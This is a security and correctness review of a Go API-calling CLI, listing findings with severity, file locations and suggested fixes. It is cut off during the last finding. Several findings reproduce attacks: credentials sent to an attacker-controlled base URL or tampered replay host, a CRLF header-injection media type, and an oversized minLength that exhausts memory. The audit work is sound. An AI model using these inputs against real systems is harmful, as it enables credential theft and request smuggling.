# Review findings — `ralph/design` vs `main`

Reviewers: security, spec-compliance, concurrency, integration (from `.ralph/stack.json`).
Spec: `docs/design/DESIGN.md` **v0.4** (amended 2026-08-03, commit `58af63c`).

**Context for this cycle.** No code has changed since the previous review (`ddb5e6a`); that cycle
ended in a design amendment rather than a fix pass, and its findings file was deliberately cleared
so this cycle starts fresh against v0.4. Several findings below were therefore reported before and
never had a fix attempted — those carry `Repeat-of: none`, because a repeat is meant to flag a
*failed fix*, not an unattempted one. Exactly one finding (2) is a true repeat: a previous fix
narrowed *which* credential replay resolves and left *where it is sent* untouched.

v0.4 supplies the policy that the previous cycle was missing (allowed host set, replay
re-derivation, unsupported-scheme reporting). Findings that would have been `Blocked-by: design`
against v0.3 are now `Blocked-by: none`.

`go test ./...` is green, so nothing below is caught by the existing suite.

---

## Finding 1: A resolved credential is transmitted to whatever host `--base-url` names
- **Reviewer:** integration
- **Severity:** CRIT
- **Blocked-by:** none
- **Repeat-of:** none
- **File:** internal/request/build.go:498
- **Description:** `binder.credentials` attaches every resolved credential to the request
  unconditionally; there is no host check anywhere in the tree. `grep -rn
  "credentials_withheld\|allow-host\|allow_hosts"` over all `.go` files returns zero hits — the
  entire §5a "Credentials bind to hosts" invariant is unimplemented. `config.Profile`
  (internal/config/config.go:56) has no `allow_hosts` field, and `Config` parses with
  `KnownFields(true)`, so adding one to a profile is a parse error today. Verified empirically:
  with `servers[0].url = https://api.example.com` and `TALARIA_AUTH_BEARER=SUPERSECRET`,
  `talaria call spec.yaml listPets --base-url http://127.0.0.1:8765` delivered
  `Authorization: Bearer SUPERSECRET` to the off-spec listener, exit 0, no stderr warning, no
  `credentials_withheld` field. DESIGN.md §5a names this exact attack: *"without that second rule,
  `--base-url https://attacker.example` sends a production key to an attacker while violating
  nothing."* Redaction does not substitute — it answers "does it print", not "who receives it".
- **Suggested fix:** Compute the allowed host set in one place (spec `servers[]` after variable
  substitution ∪ `--allow-host` ∪ profile `allow_hosts`) and pass it into `request.Build`. Have
  `credentials` divert each out-of-set credential into a `[]Withheld` on the `Request` that
  `callView`/`runResult` render as the `credentials_withheld` array in §5a, plus the one-line
  stderr warning. `auth check` must report against the same resolved set. Depends on finding 11
  (server-variable substitution) for the set to be correct.

## Finding 2: `history replay` takes its target host from the stored entry
- **Reviewer:** security, spec-compliance, integration
- **Severity:** CRIT
- **Blocked-by:** none
- **Repeat-of:** cycle 4 finding 2 — the earlier fix (`383eb98`, "restrict history replay to
  credentials inside the auth namespace") narrowed *which* env var a stored entry may resolve and
  left *where the resolved value is sent* entirely untouched. `replayableEnv` is the half that got
  fixed; the destination is the half that did not.
- **File:** cmd/talaria/history.go:578
- **Description:** `BaseURL: parsed.Scheme + "://" + parsed.Host` is read straight off `entry.URL`,
  i.e. off the JSONL file. `--base-url` is a persistent root flag so cobra accepts it on `replay`,
  but the replay path never reads it — the flag is accepted and silently discarded, which is worse
  than erroring, because the caller believes they retargeted the request. Verified empirically: a
  `history.jsonl` line hand-edited to `"url":"http://127.0.0.1:8766/steal"`, replayed with
  `TALARIA_AUTH_BEARER=SUPERSECRET`, delivered `Authorization: Bearer SUPERSECRET` to the attacker
  listener at exit 0; `history replay 1 --base-url https://elsewhere.example.com` still went to the
  recorded host. DESIGN.md §5a's replay table: *"Target host — From the current `--base-url`,
  profile, or spec — never from the stored URL. If the stored host is outside the currently allowed
  set, replay refuses with exit 2 rather than silently retargeting."* README.md:397 names this
  threat and then closes only the variable-name half of it.
- **Suggested fix:** Resolve the replay base URL from `--base-url` → profile → spec exactly as
  `binder.baseURL` does, and refuse with exit 2 when the stored host is not in the allowed set from
  finding 1. The "never from the stored URL" half is implementable independently of finding 1 and
  should land regardless.

## Finding 3: `history replay` never re-derives the request through the spec
- **Reviewer:** spec-compliance
- **Severity:** CRIT
- **Blocked-by:** none
- **Repeat-of:** none
- **File:** cmd/talaria/history.go:554
- **Description:** DESIGN.md §5a row 1 requires *"operationId, params, body — Re-bound through the
  normal request-construction path, re-validated against the current spec."* `newHistoryReplayCmd`
  never calls `loadSpec`, and `replayRequest` assembles a raw `request.Request` from
  `entry.Method`, `parsed.EscapedPath()` and the stored header/cookie/body pairs with no
  `index.Lookup`, no `request.Build`, no `config.Resolve` and no validation. The comment at
  history.go:230 states the omission as intentional ("replay reads a recorded request and needs no
  spec"), which is now drift against v0.4. Consequence: a hand-edited or foreign history file
  chooses the method, path, header set and body of a request talaria issues with live credentials
  attached, constrained by nothing. Independently, an entry whose operation was removed or whose
  required params changed replays against the old contract with no error and no `validation` block.
  §5a's one-line rule — *"a history entry is data, never instruction"* — is not met.
- **Suggested fix:** Load the spec on the replay path, re-resolve the operation by
  `entry.OperationID`, re-bind params and body through `request.Build`, re-resolve credentials via
  `config.Resolve`, and emit a `validation` block. An entry whose operationId is no longer in the
  spec fails that entry with exit 2.

## Finding 4: An unsupported security scheme is invisible — `auth check`, `call` and `run` all disagree
- **Reviewer:** security, spec-compliance, integration
- **Severity:** CRIT
- **Blocked-by:** none
- **Repeat-of:** none
- **File:** internal/config/auth.go:184
- **Description:** `Schemes` filters out every scheme `schemeReason` rejects, so an
  `oauth2`/`openIdConnect`/`mutualTLS` scheme (or an `apiKey` in an unsupported `in`) never appears
  in the `auth check` report. `cmd/talaria/auth.go:182` then treats an `Unsupported` alternative as
  a no-op, so `satisfied` returns true. `config.Resolve` meanwhile returns `clierr.Usage`
  (internal/config/auth.go:167) → exit 2, and `runner.execute` turns the same error into a *skip*
  (cmd/talaria/run.go:356) without recording it in `r.missing`, so the suite exits 0. Reproduced on
  a spec whose only scheme is `oauth2`, with `TALARIA_AUTH_BEARER=TOK` exported:

  | command | actual | required by §5 |
  |---|---|---|
  | `auth check` | `{"schemes":[]}`, exit 0 | `{"scheme":"oauth2","supported":false,"present":false}`, exit 5 |
  | `call --dry-run` | exit 2, "no usable security scheme" | exit 5 naming the scheme and the variable |
  | `run` | `outcome:"skipped"`, exit 0 | exit 5 |

  Three v0.4 §5 clauses break at once: the required report shape, the exit-5 contract in §4's table,
  and the bring-your-own-token rule (`TALARIA_AUTH_BEARER` is set and ignored). It also breaks the
  clause DESIGN.md states as non-negotiable and which predates v0.4: *"`auth check` never reports a
  scheme satisfied when the call would refuse it. The two agree by construction, or `auth check` is
  worthless to an agent."* The `run` case is the green-CI-that-proves-nothing outcome that
  `selectOperations` (run.go:198) refuses to permit elsewhere.
- **Suggested fix:** Add `Supported bool` to `config.Credential` and `authScheme`; have `Schemes`
  emit unsupported schemes with `supported:false, present:false`; in `credentialFor`, satisfy an
  unsupported requirement from `secret.Env(EnvBearer)` when it is set; change auth.go:167 from
  `clierr.Usage` to `clierr.CredentialMissing` naming the scheme and `TALARIA_AUTH_BEARER`; route a
  `CodeCredentialMissing` from `Resolve` through `r.noteMissing` in run.go rather than `res.skip`.
  Update README.md:254 with it (finding 21).

## Finding 5: A spec-supplied media type injects arbitrary headers onto the wire
- **Reviewer:** security
- **Severity:** CRIT
- **Blocked-by:** none
- **Repeat-of:** none
- **File:** internal/curl/config.go:290
- **Description:** `d.directive("header", "Content-Type: "+req.Body.ContentType)` is the one header
  path that never goes through `checkSplit`. `escapeDirective` renders CR/LF as `\r`/`\n` and
  curl's config parser un-escapes them back to real bytes — which is precisely why `checkSplit`
  exists, as its own comment at config.go:284 says ("escapeDirective is not the answer — it
  protects curl's parser, and curl un-escapes \r\n back to the two bytes on the wire").
  `ContentType` originates at internal/request/body.go:148 from a key in the spec's `content:` map,
  which is untrusted input by the product's own premise. Verified on the wire against a capture
  socket: a spec key of `"application/json\r\nX-Injected: pwned"` produced
  `Content-Type: application/json\r\nX-Injected: pwned\r\n`. A double CRLF terminates the header
  block, so a hostile spec can smuggle a second request on the same connection — inside the one
  component that holds resolved credentials. The emitted "portable reproduction" curl
  (internal/curl/render.go:130) carries a raw newline inside a single-quoted argument too. `run`
  escapes this only by accident, because it routes the media type through `--header`, where
  `SplitsRequest` catches it.
- **Suggested fix:** Call `checkSplit("header", "Content-Type", req.Body.ContentType)` in
  `document.body` before writing the directive, and reject a non-token media type in
  `binder.contentType` (internal/request/body.go:148) so a hostile spec fails at exit 2 rather than
  at exec time.

## Finding 6: A request body containing a secret is printed unredacted on stdout while history redacts it
- **Reviewer:** security
- **Severity:** CRIT
- **Blocked-by:** none
- **Repeat-of:** none
- **File:** cmd/talaria/call.go:465
- **Description:** `internal/corpus/entry.go:242` deliberately runs the *request* body through the
  response body-path redactor, with the stated rationale that "a token-refresh request carries one
  in exactly that field". `callView.Request.Body` does not. Verified end to end:

  ```
  stdout : "body":"{\"refresh_token\":\"CANARY-SUPER-SECRET\"}"
  history: "data":"{\"refresh_token\":\"<redacted>\"}"
  ```

  DESIGN.md §3 principle 0 enumerates the surfaces a credential must never reach and names stdout
  first. `buildRequest` (call.go:303) states the rule this violates verbatim: *"A pattern that hides
  a value in the permanent artifact but not on the stdout an agent reads has the firewall
  backwards."* With `--body @file` or `--body -` the value comes from a human or CI and the agent
  reads it off stdout — the exact asymmetry §1 exists to prevent. The canary suite does not catch
  it, so the §5a gate has a hole here as well.
- **Suggested fix:** Apply `redactors.Response.Body` to `view.Request.Body` in `callPayload`
  (thread the redactor in — `run` already builds one per suite). The emitted-curl case at
  internal/curl/render.go:133 is the part with real tension, since a redacted body is no longer
  runnable; the JSON field has none, so fix that unconditionally and decide the curl half
  separately.

## Finding 7: A hostile spec's `minLength` kills the process with a Go OOM
- **Reviewer:** spec-compliance
- **Severity:** CRIT
- **Blocked-by:** none
- **Repeat-of:** none
- **File:** internal/gen/gen.go:314
- **Description:** `s += strings.Repeat("x", int(*schema.MinLength)-len(s))` is unbounded. The spec
  is untrusted input by the tool's own doctrine (README: *"a spec talaria was pointed at is
  untrusted input"*) and §1 sells pointing it at any API's doc, including a fetched URL.
  Reproduced: a parameter schema with `minLength: 9007199254740991` under `talaria run` panics with
  `runtime: out of memory` in `strings.Repeat` — process death, no structured error, no exit code
  an agent can branch on, and none of the deferred cleanup (capture directory, 0600 temp body file)
  runs. `maxItems` on the array path deserves the same check.
- **Suggested fix:** Cap the pad at an explicit ceiling (`corpus.MaxBody` or a few KiB) and return a
  structured skip reason when the schema cannot be satisfied within it. Apply the same bound to
  array generation.

## Finding 8: `--output tsv` emits structurally invalid rows
- **Reviewer:** spec-compliance
- **Severity:** CRIT
- **Blocked-by:** none
- **Repeat-of:** none
- **File:** internal/output/render.go:108
- **Description:** `strings.Join(row, "\t")` with no escaping. Cell values are spec-derived free
  text: `op.Summary` (cmd/talaria/list.go:103), `r.Summary` (search.go:66), `res.Reason`
  (run.go:587), and recorded URLs and bodies (history.go:288). Reproduced with one operation whose
  summary is `"line one\nline two\twith tab"`:

  ```
  GET^I/pets^IlistPets^Iline one$
  line two^Iwith tab$
  GET^I/dogs^IlistDogs^Iplain$
  ```

  Two operations became three rows with differing column counts, so `cut -f3` silently returns
  garbage with no way for the caller to detect it. README's *"`tsv` prints bare tab-separated rows …
  for `cut` and `awk`"* is not honoured. The pretty renderer (render.go:130) feeds the same
  unescaped cells to tabwriter and mis-aligns for the same reason.
- **Suggested fix:** Escape or strip `\t`, `\r` and `\n` in TSV cells before joining; do the same
  for the pretty renderer's cells.

---

## Finding 9: An unbounded read of a remote spec OOMs the process
- **Reviewer:** security
- **Severity:** WARN
- **Blocked-by:** none
- **Repeat-of:** none
- **File:** internal/spec/source.go:127
- **Description:** `io.ReadAll(resp.Body)` with no size cap, on a URL that is untrusted by the
  product's premise, and `client.Get` follows redirects. A hostile or compromised spec endpoint
  streams until the process dies; the bytes are then also written to the never-expiring cache
  (`writeCache` has no size or count bound). `fetchTimeout` bounds the clock but not the volume.
- **Suggested fix:** Wrap the body in `io.LimitReader` with an explicit cap — a few tens of MB
  covers the 2 MB `swagger.json` the design cites — and return `clierr.SpecLoad` when it is hit.

## Finding 10: A basic credential with no colon makes curl prompt on the TTY, hanging the call
- **Reviewer:** security
- **Severity:** WARN
- **Blocked-by:** none
- **Repeat-of:** none
- **File:** internal/curl/config.go:226
- **Description:** `d.directive("user", …)` writes whatever `TALARIA_AUTH_BASIC` holds. curl reads a
  missing password from `/dev/tty`, not from the config pipe, so with stdout on a terminal the call
  blocks on an interactive prompt. Verified: 32.1 s wall clock, then
  `{"code":1,"message":"…curl outlived its 30s timeout and was killed"}` — a misleading cause that
  sends an agent looking for a slow API. Violates DESIGN.md §3.1 *"Never prompt. Never page. No
  interactivity, ever."* Under `run` the cost is per operation.
- **Suggested fix:** Reject a resolved basic credential containing no `:` before writing the
  directive — `clierr.CredentialMissing("$TALARIA_AUTH_BASIC must be user:password")` — without
  echoing the value, matching the existing "its value is not echoed" convention.

## Finding 11: Server variables in `servers[].url` are never substituted
- **Reviewer:** spec-compliance
- **Severity:** WARN
- **Blocked-by:** none
- **Repeat-of:** none
- **File:** internal/request/build.go:173
- **Description:** `firstServer` returns `Servers[0].URL` raw, and `Server.Variables` is read nowhere
  in the tree. Reproduced with `url: "https://{region}.api.example.com/v1"` and
  `variables.region.default: eu`: exit 2, *"base URL … is not an absolute http(s) URL"*. It fails
  loudly rather than silently, hence WARN — but it makes a large class of real 3.x specs uncallable
  without `--base-url`, and §5a's allowed host set is defined as the servers *"after server-variable
  substitution"*, so finding 1 cannot be correct until this is.
- **Suggested fix:** Substitute each variable's `default` (validating against `enum` where present)
  in `firstServer`, and expose the substituted set for the host-binding check.

## Finding 12: Parameter- and media-type-level `example`/`examples` are ignored by `run`'s data chain
- **Reviewer:** spec-compliance
- **Severity:** WARN
- **Blocked-by:** none
- **Repeat-of:** none
- **File:** internal/operation/operation.go:49
- **Description:** `operation.Param` carries no `Example`/`Examples`, and neither does
  `operation.MediaType` (operation.go:80). `paramValue` (internal/gen/fixtures.go:172) and `bodyFor`
  (:190) consult only the *schema*'s example, so the §5a priority order *"spec `example`/`examples`
  → user fixture files → schema-generated data"* is honoured only for schema-level examples.
  OpenAPI puts `example`/`examples` on the Parameter Object and the Media Type Object too, and that
  is where spec authors usually write them. Reproduced: a path parameter with `example: 42` at the
  parameter level produced `GET /pets/foxtrot-906` — generated data. `describe --output json` omits
  it entirely as well.
- **Suggested fix:** Carry `Example`/`Examples` on `operation.Param` and `operation.MediaType`, and
  consult them ahead of the schema's in `paramValue`/`bodyFor`.

## Finding 13: History entries are not size-bounded on read
- **Reviewer:** spec-compliance
- **Severity:** WARN
- **Blocked-by:** none
- **Repeat-of:** none
- **File:** internal/corpus/store.go:187
- **Description:** §5a's replay table requires *"Sizes and types — Bounded and type-checked before
  use. A corrupt or hostile entry fails that entry, never the process."* Type-checking is handled (a
  line that will not unmarshal is skipped at store.go:202), but nothing bounds size on the read
  path: `os.ReadFile` is unbounded, and `Body.Bytes()` (entry.go:121) base64-decodes with no cap.
  `MaxBody` is enforced only at write (entry.go:254). A hand-edited or copied `history.jsonl`
  carrying a multi-hundred-megabyte `data` field is read whole by every `history`, `history show`
  and `history replay`, then decoded again — a process-level failure where the design requires an
  entry-level one.
- **Suggested fix:** Bound the file read, and reject any single line or decoded body over `MaxBody`
  as a malformed entry rather than failing the process.

## Finding 14: SIGINT and SIGTERM are trapped for the process lifetime while three blocking calls ignore the context
- **Reviewer:** concurrency
- **Severity:** WARN
- **Blocked-by:** none
- **Repeat-of:** none
- **File:** cmd/talaria/root.go:207
- **Description:** `signal.NotifyContext` installs a permanent `signal.Notify`; after the first
  signal its goroutine exits but the registration remains, so every subsequent SIGINT/SIGTERM is
  delivered to a buffered channel and discarded. Default termination is disabled for the whole run.
  That is safe only if everything honours the context, and three reachable operations do not:
  `io.ReadAll(b.in.Stdin)` (internal/request/body.go:102), `syscall.Flock(…, LOCK_EX)`
  (internal/corpus/lock_unix.go:36 — Go installs handlers with `SA_RESTART`, so the blocked
  `flock(2)` is not interruptible either), and the version preflight (finding 15). Failure:
  `talaria call --body - <op>` with stdin a terminal or a stalled pipe blocks in `ReadAll`; Ctrl-C
  does nothing and `kill -TERM` does nothing — only Ctrl-D or `kill -9` gets out. Under
  systemd or CI a SIGTERM shutdown hangs until the SIGKILL timeout.
- **Suggested fix:** Restore default disposition after the first signal —
  `go func(){ <-ctx.Done(); stop() }()` — so a second Ctrl-C terminates, and read stdin under the
  context.

## Finding 15: The curl version preflight spawns an unbounded, uncancellable subprocess
- **Reviewer:** concurrency
- **Severity:** WARN
- **Blocked-by:** none
- **Repeat-of:** none
- **File:** internal/curl/version.go:42
- **Description:** `exec.Command(path, "--version").Output()` takes no context, no `WaitDelay` and no
  process group — `preflight` (version.go:40) does not even accept a `context.Context`. Every other
  curl in the tool is bounded by `execCtx` + `WaitDelay` + `Setpgid`; this one is not. It is reaped,
  so there is no zombie, but it is a hang: a `curl` on `PATH` that is a wrapper script blocking on
  an NFS/autofs stall, a lock, or a sandbox helper wedges `talaria call` before it has done
  anything, and per finding 14 SIGTERM will not end it.
- **Suggested fix:** Thread a context through `preflight(ctx, path)` — `ExecuteWith` already has one
  — and use `exec.CommandContext` with a short independent deadline (5 s).

## Finding 16: Every recorded call reads and parses the whole history file twice under the exclusive lock
- **Reviewer:** concurrency
- **Severity:** WARN
- **Blocked-by:** none
- **Repeat-of:** none
- **File:** internal/corpus/store.go:115
- **Description:** `Append` calls `uniqueID` → `storedIDs` → `os.ReadFile` + a per-line parse, then
  `write` appends, then `trim` (store.go:126) re-reads and re-parses the whole file. Both full scans
  happen while holding `flock(LOCK_EX)`. The store holds up to `maxPerSource` (1000) × 3 sources,
  each entry up to ~170 KB after base64 expansion of two 64 KiB `MaxBody` payloads. A `talaria run`
  over a 500-operation spec against a store already holding a few thousand entries re-reads and
  re-unmarshals everything twice per append — quadratic, tens of seconds to minutes of added suite
  time, with the cross-process lock held throughout (compounding finding 17).
- **Suggested fix:** Run `trim` only when the file could be over cap (check `os.Stat` size or a
  cheaply maintained line count), and fold `storedIDs` and `trim`'s scan into a single pass.

## Finding 17: The history lock blocks indefinitely with no deadline
- **Reviewer:** concurrency
- **Severity:** WARN
- **Blocked-by:** none
- **Repeat-of:** none
- **File:** internal/corpus/lock_unix.go:36
- **Description:** `LOCK_EX` with no `LOCK_NB` and no deadline, and (per finding 14) not
  interruptible by a signal. Combined with finding 16, a long `run` holds the lock for a long time:
  a `talaria call` in another terminal blocks in `flock` with no output and cannot be Ctrl-C'd, and
  a stale NFS mount holding the lock file blocks forever. The comment at lock_unix.go:33 justifies
  the unbounded wait ("one that gave up would drop history the caller was told had been recorded"),
  but `recordCall` already downgrades an `Append` failure to a stderr warning, so a bounded wait
  costs a warning line, not a silent loss.
- **Suggested fix:** Loop on `LOCK_EX|LOCK_NB` with a short sleep against a bounded deadline (a few
  seconds) and the caller's context, then fail with the existing "cannot lock the history file"
  error.

## Finding 18: Replay's resolvable env-var set extends past the `TALARIA_AUTH_*` namespace
- **Reviewer:** security, spec-compliance
- **Severity:** WARN
- **Blocked-by:** design — DESIGN.md §5a's replay table is unconditional (*"Only names inside the
  `TALARIA_AUTH_*` namespace are resolvable. A stored entry naming any other variable is malformed,
  not a lookup"*), while §5, AGENT.md:249 and README.md:263 all permit a profile's `auth:` map to
  reference an arbitrary variable, and the code implements the latter. Two shipped documents now
  contradict each other; a fix must choose between narrowing `replayableEnv` to the namespace
  (breaking documented profile behaviour) and amending §5a's row to read "the `TALARIA_AUTH_*`
  namespace plus the variables the active profile's `auth` map names". The reviewer cannot pick.
- **Repeat-of:** none
- **File:** cmd/talaria/history.go:733
- **Description:** `replayableEnv` returns `prof.ReferencesEnv(ref.Name)` in addition to the
  namespace check, so with `--profile staging` whose `auth: {bearerAuth: ${STAGING_TOKEN}}`, a
  stored entry naming `env:STAGING_TOKEN` in an arbitrary header position resolves and is
  transmitted. The reasoning at internal/config/auth.go:320 is sound — a profile is human-authored,
  the file's mode is enforced at config.go:157, and it is only in force when `--profile` is passed —
  so the code is arguably the better rule. This is a doc conflict, not a code defect, but it
  blocks a clean answer to "what may replay resolve".
- **Suggested fix:** Decide and record it. Recommended: amend §5a's table row to name the profile's
  variables, leaving the code as-is.

## Finding 19: The canary gate has no case for the validation error path
- **Reviewer:** integration
- **Severity:** WARN
- **Blocked-by:** none
- **Repeat-of:** none
- **File:** internal/canary/canary_test.go:427
- **Description:** The comment says *"A response-validation failure is not here because response
  validation is not built yet (plan tasks 26 and 27). Whoever adds --fail-on-error adds the case."*
  Response validation **is** built on this branch (`internal/validate`, `call --fail-on-error` at
  cmd/talaria/call.go:215, exit 4), so the comment is stale and the case was never added. The
  `stages` table (canary_test.go:430–480) has no exit-4 stage, so nothing greps `validation.errors[]`
  messages, the `callFailure` stderr, or the `run --report junit` `<failure message=…>` for a
  canary. §5a's leak-channel table names *"validation errors quoting the request"* as a channel and
  adds *"Test explicitly — error paths are where redaction bugs live."*
- **Suggested fix:** Add a stage calling an operation that returns a schema-violating body with a
  credential set, asserting exit 4, plus a `run --report junit --fail-on-error` counterpart; scan
  both streams and the JUnit XML.

## Finding 20: The canary suite never injects a credential through a profile `auth:` reference
- **Reviewer:** integration
- **Severity:** WARN
- **Blocked-by:** none
- **Repeat-of:** none
- **File:** internal/canary/canary_test.go:99
- **Description:** Every entry in `mechanisms` (canary_test.go:99–151) sets a `TALARIA_AUTH_*`
  variable. The only profile-`auth:` case is `TestACredentialResolutionFailureNamesNoValue`, which
  tests a *rejected literal*. The successful path — `profileRef` at internal/config/auth.go:348
  resolving `${STAGING_TOKEN}` — is never carried through a real call, though DESIGN.md §5 names
  profiles as one of the two credential sources and §5a requires the suite to inject through
  *every* auth mechanism. It is also the path that widens `replayableEnv` (finding 18), so it is the
  higher-risk of the two.
- **Suggested fix:** Add a mechanism whose `env` sets an arbitrary variable name and whose harness
  writes `profiles: {p: {auth: {bearerAuth: "${MY_TOKEN}"}}}`, driven through the same
  `call`/`history`/`replay`/`run` sequence as the env-var mechanisms.

## Finding 21: README documents the pre-amendment auth behaviour as intended
- **Reviewer:** spec-compliance
- **Severity:** WARN
- **Blocked-by:** none
- **Repeat-of:** none
- **File:** README.md:254
- **Description:** *"schemes talaria cannot supply at all (OAuth2, OpenID Connect) are left out
  rather than reported missing"* is exactly the behaviour DESIGN.md §5 v0.4 now forbids.
  README.md:165–170's "bring your own token and let a `bearer` scheme carry it" also does not
  describe a reachable workaround: a spec declaring only `oauth2` has no bearer scheme for a token
  to be carried by, so `TALARIA_AUTH_BEARER` is inert (verified in finding 4). AGENT.md is silent on
  unsupported schemes, so it needs the new behaviour added rather than corrected.
- **Suggested fix:** Rewrite both README passages and add an AGENT.md section alongside the fix for
  finding 4.

## Finding 22: `history replay` silently sends the redacted request body
- **Reviewer:** integration
- **Severity:** WARN
- **Blocked-by:** none
- **Repeat-of:** none
- **File:** cmd/talaria/history.go:595
- **Description:** `corpus.Redactors.requestBody` (internal/corpus/entry.go:242) stores
  `{"refresh_token":"REAL"}` as `{"refresh_token":"<redacted>"}`, which is correct per §5a. But
  `replayRequest` checks only `body.Truncated`; it never scans the decoded body for
  `secret.Placeholder`, so it sends the redacted document verbatim. Verified: the replayed POST
  arrived as `{"grant":"x","refresh_token":"\u003credacted\u003e"}` with empty stderr. Headers,
  cookies and query params get `warnUnreplayable` (history.go:746) for exactly this situation; the
  body gets nothing, so the caller believes they reissued the original request.
- **Suggested fix:** Scan the decoded body for `secret.Placeholder` and either refuse the replay, as
  with a truncated body, or warn on stderr the way `warnUnreplayable` does.

## Finding 23: `Append` reports failure for an entry that was successfully written
- **Reviewer:** concurrency
- **Severity:** WARN
- **Blocked-by:** none
- **Repeat-of:** none
- **File:** internal/corpus/store.go:126
- **Description:** `write` has already durably appended the line when `trim(path)` runs, so a `trim`
  failure (its `os.ReadFile` at store.go:248, or `replace`'s `CreateTemp`/`Rename`) propagates as
  `Append`'s error. On a full filesystem `write` succeeds for a small line, `replace` fails on
  `CreateTemp`, and `recordCall` prints *"warning: the call was not recorded in history: cannot
  stage the trimmed history: …"* — the opposite of what happened. An operator acting on that warning
  re-runs a mutating call believing nothing was recorded.
- **Suggested fix:** Return a distinguishable error, or report the trim failure separately and
  return nil once the line is on disk.

## Finding 24: `storedIDs` treats any read failure as an empty store, permitting duplicate ids
- **Reviewer:** concurrency
- **Severity:** WARN
- **Blocked-by:** none
- **Repeat-of:** none
- **File:** internal/corpus/store.go:161
- **Description:** `os.ReadFile` errors are all collapsed to `return nil`, not just
  `fs.ErrNotExist` (contrast store.go:188, which does distinguish). Every candidate id then looks
  free. If the history file's mode was changed to 0400, or on an EIO, `uniqueID` returns a raw
  timestamp already held by an entry and `write` appends the duplicate. `selectEntry`
  (cmd/talaria/history.go:419) resolves an id to the newest match, so `history replay <id>` silently
  re-issues a different request than `history show <id>` displayed — precisely the failure the
  comment at store.go:133 says the id field exists to prevent.
- **Suggested fix:** Distinguish `fs.ErrNotExist` from other errors and abort the append on a
  genuine read failure.

## Finding 25: The remote spec cache never expires and cannot be bypassed
- **Reviewer:** integration
- **Severity:** WARN
- **Blocked-by:** design — DESIGN.md §4 says only "URL (with local cache)". It never states a TTL,
  an invalidation rule, or a refresh mechanism, so any fix invents the policy. The decision is
  between a time-based TTL, an `ETag`/`Last-Modified` conditional GET, and an explicit
  `--refresh`/`--no-cache` flag (or some combination).
- **Repeat-of:** none
- **File:** internal/spec/source.go:86
- **Description:** Once a URL-sourced spec is cached under `sha256(url)` it is served forever: no
  TTL, no conditional request, no bypass flag, and no command that clears it. Every downstream
  stage then works against a possibly-stale contract — most damagingly `validate`, where `run`
  reports schema violations the server never committed, with nothing distinguishing that from a real
  failure.
- **Suggested fix:** Decide the policy, record it in DESIGN.md §4, then implement it.

---

## Finding 26: The non-unix corpus lock is a silent no-op
- **Reviewer:** concurrency
- **Severity:** INFO
- **Blocked-by:** none
- **Repeat-of:** none
- **File:** internal/corpus/lock_other.go:11
- **Description:** Returns `func(){}, nil` with no signal to the caller, so on windows/plan9/wasip1
  two concurrent processes get no serialisation. `os.File.Write` loops over multiple `write(2)`
  calls for a large line, so two concurrent appends of a ~170 KB entry can interleave into
  unparseable lines that `Read` then skips — both entries vanish silently. Impact is limited because
  talaria targets unix, as the comment says.
- **Suggested fix:** Either take a `golang.org/x/sys/windows` `LockFileEx` dependency, or have `New`
  refuse to record on a platform with no lock rather than recording unsafely.

## Finding 27: `ErrWaitDelay` on a successful curl is reported as "cannot run curl"
- **Reviewer:** concurrency
- **Severity:** INFO
- **Blocked-by:** none
- **Repeat-of:** none
- **File:** internal/curl/exec.go:104
- **Description:** When curl exits 0 but a grandchild still holds an output pipe, `Wait` returns
  `exec.ErrWaitDelay` after `killGrace`. Neither `ctx.Err()` nor `execCtx.Err()` is set and
  `errors.As(err, &exitErr)` fails, so `runFailure` (exec.go:119) returns exit 1 with "cannot run
  curl: exec: WaitDelay expired before I/O complete" for a request that actually completed — and the
  response, already in the capture files, is discarded. Reachable via `--proxy socks5h://` where the
  helper outlives curl.
- **Suggested fix:** `if errors.Is(err, exec.ErrWaitDelay) && cmd.ProcessState.Success()` — fall
  through to `readResponse`.

## Finding 28: A large `--timeout` overflows into an already-expired context
- **Reviewer:** concurrency
- **Severity:** INFO
- **Blocked-by:** none
- **Repeat-of:** none
- **File:** internal/curl/exec.go:82
- **Description:** `context.WithTimeout(ctx, opts.MaxTime+killGrace)` overflows `int64` when
  `MaxTime > MaxInt64 - 2s`. `--timeout 9223372036` yields a `MaxTime` that fits but wraps negative
  once `killGrace` is added, so every request fails instantly with "curl outlived its
  2562047h47m16s timeout and was killed". `withDefaults` (config.go:53) guards only the
  non-positive case.
- **Suggested fix:** Clamp `MaxTime` to a sane ceiling in `withDefaults`, or saturate the addition.

## Finding 29: `cleanupWith` zeroes only a copy of the config document
- **Reviewer:** concurrency
- **Severity:** INFO
- **Blocked-by:** none
- **Repeat-of:** none
- **File:** internal/curl/config.go:120
- **Description:** `config = []byte(doc.b.String())` copies (`strings.Builder.String` aliases
  `b.buf`; the `[]byte` conversion copies), and `doc.b.Reset()` sets `b.buf = nil` without zeroing
  it. `cleanupWith` (config.go:382) therefore zeroes the copy while the original heap buffer —
  holding the resolved bearer token or `user:password` — stays readable until the GC reuses that
  memory. The doc comment at config.go:85 claims the values "do not linger in a buffer the rest of
  the process can still reach", which is not what the code does.
- **Suggested fix:** Build into a `[]byte` field the document owns rather than a `strings.Builder`,
  and `clear()` it.

## Finding 30: `internal/corpus` imports `internal/curl`
- **Reviewer:** integration
- **Severity:** INFO
- **Blocked-by:** none
- **Repeat-of:** none
- **File:** internal/corpus/entry.go:24
- **Description:** `NewEntry` takes a `*curl.Response`, so `corpus` depends on the outbound
  executor. DESIGN.md §5 says *"`corpus` backs both `history` and the twin"* and *"Twin's serve side
  uses `net/http` directly — curl is only for outbound calls."* internal/e2e/boundary_test.go:33
  guards `operation`/`validate`/`gen` against `curl`/`corpus`/`twin` but says nothing about
  `corpus → curl`, so this passes today and will silently drag the executor into the twin at Phase
  6.
- **Suggested fix:** Have `NewEntry` take a local `Observed{Status, Headers, Body, TimingMS}` struct
  that `cmd/talaria` fills from `curl.Response`, and add `corpus` to the guarded list in
  `boundary_test.go`.

## Finding 31: `history` list drops `timing_ms` for a call that rounded to 0 ms
- **Reviewer:** integration
- **Severity:** INFO
- **Blocked-by:** none
- **Repeat-of:** none
- **File:** cmd/talaria/history.go:48
- **Description:** `TimingMS int64 \`json:"timing_ms,omitempty"\`` — a call against a local twin or
  `127.0.0.1` that rounds to 0 ms loses the field entirely, so an agent cannot tell "0 ms" from "no
  response observed". `runResult` uses `*int64` at cmd/talaria/run.go:57 for precisely this reason,
  with a comment saying so, and the stored `corpus.EntryResponse.TimingMS` (entry.go:92) correctly
  has no `omitempty`. The loss is only in the `history` list view.
- **Suggested fix:** Make `historyEntryView.TimingMS` a `*int64` set only when `entry.Response !=
